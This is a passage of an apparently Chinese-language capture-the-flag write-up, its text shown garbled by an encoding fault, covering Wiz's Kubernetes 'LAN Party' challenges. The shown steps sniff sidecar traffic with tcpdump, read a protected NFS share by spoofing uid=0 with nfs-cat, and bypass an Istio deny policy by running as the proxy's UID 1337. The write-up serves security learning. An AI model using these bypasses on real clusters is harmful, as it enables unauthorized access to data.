10.100.171.123:80       TIME_WAIT   timewait (10.26/0/0)</span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node   Path</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°çš„192.168.8.215 ä¸€ç›´å‘ 10.100.171.123:80 é€šä¿¡</p>
<ol start="4">
<li>å¥½å§ï¼Œçœ‹äº†wpï¼Œç›´æ¥ <code>tcpdump</code> æ•è·æµé‡è¯¦ç»†çœ‹çœ‹é€šä¿¡ç»†èŠ‚ã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ tcpdump host 10.100.171.123  -w 1.pcap</span><br><span class="line">tcpdump: listening on ns-252e81, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">^C30 packets captured</span><br><span class="line">30 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">cat</span> 1.pcap</span><br><span class="line">Ã”ÃƒÂ²Â¡Ã¯Ã½eÂ«Â¾</span><br><span class="line">JJ&gt;Ã²VA4<span class="comment">#&#x27;|&#125;E&lt;6y@EÃ¤Ã€Ã—</span></span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ´</span><br><span class="line">\\IÃ¯Ã½eÂ³Ã€</span><br><span class="line">JJ<span class="string">&#x27;|&#125;Âª&gt;Ã²VA4E&lt;@|]</span></span><br><span class="line"><span class="string">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­Ã‹+SPÃ¾Â´</span></span><br><span class="line"><span class="string">Â¡Ã®Ã¹\\IÃ¯Ã½eÂ¾Ã€</span></span><br><span class="line"><span class="string">BB&gt;Ã²VA4#&#x27;</span>|&#125;E46z@EÃ«Ã€Ã—</span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ­ÃŒÃ¶</span><br><span class="line"></span><br><span class="line">\\IÂ¡Ã®Ã¹Ã¯Ã½eÃ¬Ã€</span><br><span class="line">&gt;Ã²VA4<span class="comment">#&#x27;|&#125;E</span></span><br><span class="line">6&#123;@EÃ€Ã—</span><br><span class="line">dÂ«&#123;Â²Â¢P+SPÂ­ÃŒÃ¶[</span><br><span class="line">\\IÂ¡Ã®Ã¹POST / HTTP/1.1</span><br><span class="line">Host: reporting-service</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 63</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;Ã¯Ã½eÃ‚</span><br><span class="line">BB<span class="string">&#x27;|&#125;Âª&gt;Ã²VA4E4Ã¡@Ã¢</span></span><br><span class="line"><span class="string">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­ÃŒ+SQtÃ¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Â¡Ã®Ãº\\IÃ¯Ã½eÃ«ÃŠ</span></span><br><span class="line"><span class="string">&#x27;</span>|&#125;Âª&gt;Ã²VA4EÃ¡@</span><br><span class="line">dÂ«&#123;Ã€Ã—PÂ²Â¢Â»Â­ÃŒ+SQtÃ¼R</span><br><span class="line">Â¡Ã®Ã¼\\IHTTP/1.1 200 OK</span><br><span class="line">server: istio-envoy</span><br><span class="line"><span class="built_in">date</span>: Fri, 22 Mar 2024 05:11:11 GMT</span><br><span class="line">content-type: text/plain</span><br><span class="line">x-envoy-upstream-service-time: 1</span><br><span class="line">x-envoy-decorator-operation: :0/*</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><code>wiz_k8s_lan_party&#123;good-crime-comes-with-a-partner-in-a-sidecar&#125;</code></p>
<h2 id="Challenge-3ï¼šDATA-LEAKAGE"><a href="#Challenge-3ï¼šDATA-LEAKAGE" class="headerlink" title="Challenge 3ï¼šDATA LEAKAGE"></a>Challenge 3ï¼šDATA LEAKAGE</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><strong>Exposed File Share</strong></p>
<blockquote>
<p>The targeted big corp utilizes outdated, yet  cloud-supported technology for data storage in production. But oh my,  this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.</p>
</blockquote>
<p><strong>Hint</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½ å¯èƒ½ä¼šå‘ç°æŸ¥çœ‹ nfs-cat å’Œ nfs-ls çš„æ–‡æ¡£å¾ˆæœ‰ç”¨ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul>
<li>Network File Systemï¼ˆNFSï¼‰</li>
<li>mount</li>
<li>nfs-catã€nfs-ls</li>
</ul>
<h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol>
<li><h4 id="nfs-cat-å’Œ-nfs-ls"><a href="#nfs-cat-å’Œ-nfs-ls" class="headerlink" title="nfs-cat å’Œ nfs-ls"></a><code>nfs-cat</code> å’Œ <code>nfs-ls</code></h4><p>å…³æ³¨æè¿°é‡Œçš„ï¼šâ€this technology was introduced in an era when access control was only network-basedâ€ï¼Œå’Œæç¤ºç»™çš„ <code>nfs-cat</code> å’Œ <code>nfs-ls</code></p>
</li>
<li><h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4></li>
</ol>
<p>NFSï¼Œæ˜¯ Network File System çš„ç®€å†™ï¼Œå³ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿã€‚ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿæ˜¯FreeBSDæ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ç§ï¼Œä¹Ÿè¢«ç§°ä¸ºNFS. NFSå…è®¸ä¸€ä¸ªç³»ç»Ÿåœ¨ç½‘ç»œä¸Šä¸ä»–äººå…±äº«ç›®å½•å’Œæ–‡ä»¶ã€‚ é€šè¿‡ä½¿ç”¨NFSï¼Œç”¨æˆ·å’Œç¨‹åºå¯ä»¥åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·è®¿é—®è¿œç«¯ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚</p>
<p>å°±æ˜¯ä¸€ä¸ªæ•°æ®å­˜å‚¨æœåŠ¡å™¨æˆ–è€…æœåŠ¡ï¼Œè·Ÿä¸»æœºä¹‹é—´é€šè¿‡ nfs æ¥é€šä¿¡ï¼Œä¸»è¦æ˜¯æŒ‚è½½ã€‚</p>
<ol start="3">
<li><h4 id="æŸ¥çœ‹-mount"><a href="#æŸ¥çœ‹-mount" class="headerlink" title="æŸ¥çœ‹ mount"></a>æŸ¥çœ‹ mount</h4></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ mount | grep nfs    </span><br><span class="line">fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs <span class="built_in">type</span> nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.4.189,local_lock=none,addr=192.168.124.98)</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¥½ä¸œè¥¿ï¼Œè¿™ä¸å¾—çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿ã€‚</p>
<blockquote>
<p>GPT è§£é‡Šï¼š</p>
<ul>
<li><code>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com</code>: è¿™æ˜¯ä¸€ä¸ª NFS æ–‡ä»¶ç³»ç»Ÿçš„è¿œç¨‹æœåŠ¡å™¨åœ°å€ã€‚NFSï¼ˆNetwork File Systemï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿåè®®ï¼Œå…è®¸è¿œç¨‹è®¡ç®—æœºé€šè¿‡ç½‘ç»œå…±äº«æ–‡ä»¶ã€‚</li>
<li><code>:/</code>: è¿™è¡¨ç¤ºå°†è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•æŒ‚è½½åˆ°æœ¬åœ°ç›®å½•ã€‚å†’å·ä¹‹å‰æ˜¯è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€å’Œå…±äº«çš„è·¯å¾„ï¼Œå†’å·ä¹‹åæ˜¯æŒ‚è½½ç‚¹ã€‚</li>
<li><code>/efs</code>: è¿™æ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè¿œç¨‹ NFS æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•å°†ä¼šè¢«æŒ‚è½½åˆ°æœ¬åœ°çš„ <code>/efs</code> ç›®å½•ã€‚</li>
</ul>
</blockquote>
<ol start="4">
<li><h4 id="å‘ç°-flag"><a href="#å‘ç°-flag" class="headerlink" title="å‘ç° flag"></a>å‘ç° flag</h4></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:/var/run/secrets$ <span class="built_in">cd</span> /efs</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">player@wiz-k8s-lan-party:/efs$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure>

<p>å‘µå‘µå‘µ</p>
<p>æƒ³åˆ°hinté‡Œçš„ <code>nfs-cat</code> å’Œ <code>nfs-ls</code></p>
<p><code>nfs-cat</code> å’Œ <code>nfs-ls</code> æ˜¯ NFS (Network File System) çš„ä¸€äº›å¸¸è§å·¥å…·ï¼Œç”¨äºä» NFS æœåŠ¡å™¨ä¸Šè¯»å–æ–‡ä»¶å†…å®¹å’Œåˆ—å‡ºç›®å½•å†…å®¹ã€‚è¿™äº›å·¥å…·é€šå¸¸éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸Šå®‰è£…å¹¶é…ç½® NFS å®¢æˆ·ç«¯æ¥ä½¿ç”¨ã€‚å­¦å­¦è§„åˆ™ï¼Œæ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“æ˜¯æˆ‘çš„é—®é¢˜è¿˜æ˜¯<code>nfs server</code> æŒ‚äº†ï¼Œè¿ä¸ä¸Šã€‚æœäº†</p>
<p>å¥½å§ï¼šæ ¼å¼è¿˜æ˜¯å¥½å¥½çœ‹æ¸…æ¥šï¼Œè¿˜è¦åŠ ä¼ å‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ nfs-cat <span class="string">&#x27;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4.1&amp;uid=0&#x27;</span></span><br><span class="line">wiz_k8s_lan_party&#123;old-school-network-file-shares-infiltrated-the-cloud!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Challenge-4ï¼šBYPASSING-BOUNDARIES"><a href="#Challenge-4ï¼šBYPASSING-BOUNDARIES" class="headerlink" title="Challenge 4ï¼šBYPASSING BOUNDARIES"></a>Challenge 4ï¼šBYPASSING BOUNDARIES</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><strong>The Beauty and The Ist</strong></p>
<blockquote>
<p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Donâ€™t abuse this power; use it responsibly and with caution.</p>
</blockquote>
<p><strong>hint</strong> <code>Try examining Istio&#39;s [IPTables rules](&lt;https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables&gt;).</code></p>
<p>é¢˜ç›®ç»™çš„ policy</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æµ…æµ…é—®ä¸€æ³¢ gptï¼šè¿™ä¸ª AuthorizationPolicy å®šä¹‰äº†ä¸€ä¸ªè®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œæ‹’ç»å…·æœ‰ç‰¹å®šæ ‡ç­¾çš„åº”ç”¨ç¨‹åºï¼ˆâ€{flag-pod-name}â€ï¼‰çš„è¯·æ±‚ï¼ŒåŒæ—¶åªå…è®¸æ¥è‡ª k8s-lan-party å‘½åç©ºé—´çš„ POST å’Œ GET è¯·æ±‚è®¿é—®ç›®æ ‡èµ„æºã€‚</p>
</blockquote>
<h3 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul>
<li>Istio</li>
<li>IPTables</li>
<li>PID&#x2F;UID&#x2F;GID</li>
</ul>
<h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol>
<li>æ‰“å¼€é¶åœºç»™çš„ <code>root</code> å¾ˆéš¾ä¸è®©æˆ‘æƒ³åˆ°é€ƒé€¸ã€‚å“ˆå“ˆã€‚</li>
<li>å…ˆå­¦ä¸€ä¸‹ hint é‡Œé¢çš„ <code>lstio</code> å’Œ<code>iptabl</code></li>
</ol>
<h4 id="lstio"><a href="#lstio" class="headerlink" title="lstio"></a>lstio</h4><blockquote>
<p>å®ƒæ˜¯ä¸€ä¸ªå®Œå…¨å¼€æºçš„æœåŠ¡ç½‘æ ¼ï¼Œä»¥é€æ˜å±‚çš„æ–¹å¼æ„å»ºåœ¨ç°æœ‰åˆ†å¸ƒå¼åº”ç”¨ä¸­ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªæä¾›äº†å„ç§APIçš„å¹³å°ï¼Œå¯ä»¥ä¸ä»»ä½•æ—¥å¿—å¹³å°ã€ç›‘æ§ç³»ç»Ÿæˆ–ç­–ç•¥ç³»ç»Ÿé›†æˆã€‚Istioçš„å¤šæ ·åŒ–ç‰¹æ€§å¯ä»¥è®©ä½ é«˜æ•ˆåœ°è¿è¡Œåˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„ï¼Œå¹¶æä¾›ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥ä¿æŠ¤ã€è¿æ¥å’Œç›‘æ§å¾®æœåŠ¡</p>
</blockquote>
<h4 id="iptabl"><a href="#iptabl" class="headerlink" title="iptabl"></a>iptabl</h4><blockquote>
<p><code>iptables</code> æ˜¯ Linux å†…æ ¸ä¸­çš„é˜²ç«å¢™è½¯ä»¶ netfilter çš„ç®¡ç†å·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ netfilter çš„ä¸€éƒ¨åˆ†ã€‚Netfilter ä½äºå†…æ ¸ç©ºé—´ï¼Œä¸ä»…æœ‰ç½‘ç»œåœ°å€è½¬æ¢çš„åŠŸèƒ½ï¼Œä¹Ÿå…·å¤‡æ•°æ®åŒ…å†…å®¹ä¿®æ”¹ã€ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤ç­‰é˜²ç«å¢™åŠŸèƒ½ã€‚</p>
</blockquote>
<p>iptable ä¸­ä¸€å…±æœ‰äº”å¼ è¡¨ï¼Œåˆ†åˆ«è´Ÿè´£ä¸åŒçš„æ–¹å‘(æ•°æ®åŒ…ã€é˜²ç«å¢™ã€ç½‘ç»œåœ°å€è½¬æ¢ã€æ•°æ®åŒ…ä¿®æ”¹ã€è®¿é—®æ§åˆ¶)ï¼Œä¸åŒåœ°æ–¹è¡¨å…·æœ‰çš„é“¾è·¯(è¾“å…¥è¾“å‡ºç­‰)ä¹Ÿä¸åŒã€‚</p>
<p>ä»¥ <code>filtter</code> è¡¨ä¸ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -L -v</span><br><span class="line">Chain INPUT (policy ACCEPT 350K packets, 63M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br><span class="line">Chain OUTPUT (policy ACCEPT 18M packets, 1916M bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°ä¸‰ä¸ªé»˜è®¤çš„é“¾ï¼Œåˆ†åˆ«æ˜¯ INPUTã€FORWARD å’Œ OUTPUTï¼Œæ¯ä¸ªé“¾ä¸­çš„ç¬¬ä¸€è¡Œè¾“å‡ºè¡¨ç¤ºé“¾åç§°ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º INPUT&#x2F;FORWARD&#x2F;OUTPUTï¼‰ï¼Œåè·Ÿé»˜è®¤ç­–ç•¥ï¼ˆACCEPTï¼‰ã€‚</p>
<p>æ¯æ¡é“¾ä¸­éƒ½å¯ä»¥æ·»åŠ å¤šæ¡è§„åˆ™ï¼Œè§„åˆ™æ˜¯æŒ‰ç…§é¡ºåºä»å‰åˆ°åæ‰§è¡Œçš„ã€‚çœ‹ä¸‹è§„åˆ™çš„è¡¨å¤´å®šä¹‰ã€‚</p>
<ul>
<li><strong>pkts</strong>ï¼šå¤„ç†è¿‡çš„åŒ¹é…çš„æŠ¥æ–‡æ•°é‡</li>
<li><strong>bytes</strong>ï¼šç´¯è®¡å¤„ç†çš„æŠ¥æ–‡å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰</li>
<li><strong>target</strong>ï¼šå¦‚æœæŠ¥æ–‡ä¸è§„åˆ™åŒ¹é…ï¼ŒæŒ‡å®šç›®æ ‡å°±ä¼šè¢«æ‰§è¡Œã€‚</li>
<li><strong>prot</strong>ï¼šåè®®ï¼Œä¾‹å¦‚ <code>tdp</code>ã€<code>udp</code>ã€<code>icmp</code> å’Œ <code>all</code>ã€‚</li>
<li><strong>opt</strong>ï¼šå¾ˆå°‘ä½¿ç”¨ï¼Œè¿™ä¸€åˆ—ç”¨äºæ˜¾ç¤º IP é€‰é¡¹ã€‚</li>
<li><strong>in</strong>ï¼šå…¥ç«™ç½‘å¡ã€‚</li>
<li><strong>out</strong>ï¼šå‡ºç«™ç½‘å¡ã€‚</li>
<li><strong>source</strong>ï¼šæµé‡çš„æº IP åœ°å€æˆ–å­ç½‘ï¼Œæˆ–è€…æ˜¯ <code>anywhere</code>ã€‚</li>
<li><strong>destination</strong>ï¼šæµé‡çš„ç›®çš„åœ° IP åœ°å€æˆ–å­ç½‘ï¼Œæˆ–è€…æ˜¯ <code>anywhere</code>ã€‚</li>
</ul>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><ul>
<li>serviceï¼šdnscan æ‰«æ</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>

<p>å‘½åç©ºé—´æ²¡é—®é¢˜ï¼Œé—®é¢˜åœ¨äºè¢«æ‹’ç»äº†ï¼šå…·æœ‰ç‰¹å®šæ ‡ç­¾ <code>&#123;flag-pod-name&#125;</code> çš„åº”ç”¨ç¨‹åºï¼ˆâ€<code>istio-protected-pod-service</code>â€œï¼‰çš„è¯·æ±‚</p>
<h4 id="hint-åˆ†æ"><a href="#hint-åˆ†æ" class="headerlink" title="hint åˆ†æ"></a>hint åˆ†æ</h4><p>å…³é”®æ¦‚å¿µï¼š<strong>Magic constants</strong></p>
<p>1337 - uid and gid used to distinguish between traffic originating from proxy vs the applications.</p>
<p>é‡è¦çš„å°±æ˜¯</p>
<blockquote>
<p><strong>Outbound bypass</strong></p>
<ul>
<li>If you observe the iptables rules above, you will see a magic number (1337) appear several times. <strong><code>This is the uid/gid of the running proxy which is used by iptables</code></strong> to differentiate between packets originating from the proxy and the ones originating from the application. When packets originate from the application, they must be redirected to proxy to implement a service mesh. When packets originate from the proxy, <strong><code>they \*must not\* be redirected</code></strong> as doing so will cause an infinite loop.</li>
</ul>
</blockquote>
<p>This can cause multiple issues.</p>
<p>If the cluster is not mTLS, the outbound policies could be bypassed such as <code>Data leak prevention</code></p>
<h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p>æŸ¥çœ‹ UID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin</span><br><span class="line">istio:x:1337:1337::/home/istio:/bin/sh</span><br><span class="line">player:x:1001:1001::/home/player:/bin/sh</span><br></pre></td></tr></table></figure>

<p>å‘ç°äº®ç‚¹ï¼š<code>istio:x:1337:1337::/home/istio:/bin/sh</code>  ï¼Œroot(ä¹Ÿå°±æ˜¯å½“å‰ç”¨æˆ·)UIDå’ŒGIDä¸º <code>1337</code></p>
<p>æ ¹æ®ï¼š<a target="_blank" rel="noopener" href="https://github.com/istio/istio/issues/4286">https://github.com/istio/istio/issues/4286</a></p>
<p>æˆ‘ä»¬ç›´æ¥åˆ‡è¿™ä¸ªç”¨æˆ·ç„¶åå°±å¯ä»¥ç»•è¿‡ <code>deny</code> äº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-k8s-lan-party:~<span class="comment"># su istio</span></span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1337(istio) gid=1337(istio) <span class="built_in">groups</span>=1337(istio)</span><br><span class="line">$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;only-leet-hex0rs-can-play-both-k8s-and-linux&#125;$ </span><br></pre></td></tr></table></figure>

<h2 id="challenge-5ï¼šLATERAL-MOVEMENT"><a href="#challenge-5ï¼šLATERAL-MOVEMENT" class="headerlink" title="challenge 5ï¼šLATERAL MOVEMENT"></a>challenge 5ï¼šLATERAL MOVEMENT</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><h4 id="Who-will-guard-the-guardians"><a href="#Who-will-guard-the-guardians" class="headerlink" title="Who will guard the guardians?"></a><strong>Who will guard the guardians?</strong></h4><blockquote>
<p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p>
</blockquote>
<h4 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a><strong>Hint</strong></h4><blockquote>
<p>Need a hand crafting AdmissionReview requests? Checkout  <a target="_blank" rel="noopener" href="https://github.com/anderseknert/kube-review">https://github.com/anderseknert/kube-review</a>.</p>
</blockquote>
